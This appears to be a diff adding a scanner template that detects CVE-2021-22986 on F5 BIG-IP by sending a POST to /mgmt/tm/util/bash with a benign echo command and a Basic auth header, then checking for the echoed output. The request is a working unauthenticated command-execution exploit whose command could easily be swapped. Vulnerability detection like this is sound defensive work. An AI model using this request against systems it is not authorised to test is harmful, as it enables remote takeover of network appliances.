@@ -1,0 +1,26 @@
+name: F5 BIG-IP iControl REST Unauthenticated RCE CVE-2021-22986
+manual: true
+query: product="F5-BIGIP"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mgmt/tm/util/bash
+      headers:
+        Authorization: Basic YWRtaW46QVNhc1M=
+      body: '{"command":"run","utilCmdArgs":"-c ''echo tsxts|base64''"}'
+      follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(b"dHN4dHMK")
+expression: r0()
+detail:
+  links:
+  - https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986
+  - https://support.f5.com/csp/article/K03009991
+  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22986
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-22986
+  description: BIG-IP software products are licensed modules that run on top of F5's
+    Traffic Management Operation System® (TMOS). This custom operating system is an
+    event driven operating system designed specifically to inspect network and application
+    traffic and make real-time decisions based on the configurations you provide.
+  tags: RCE
